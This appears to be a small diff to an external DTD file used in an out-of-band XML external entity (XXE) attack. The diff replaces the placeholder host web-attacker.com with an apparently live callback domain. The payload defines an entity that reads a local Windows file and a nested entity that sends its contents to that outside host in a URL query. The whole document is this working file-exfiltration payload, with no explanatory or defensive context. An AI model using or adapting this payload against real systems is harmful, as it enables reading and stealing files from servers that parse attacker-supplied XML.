@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///c:/WINDOWS/system32/drivers/etc/networks">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://1nppgrllz5fgllk7946i1v0mwd24q1eq.x9.to/?x=%file;'>">
 %eval;
 %exfiltrate;
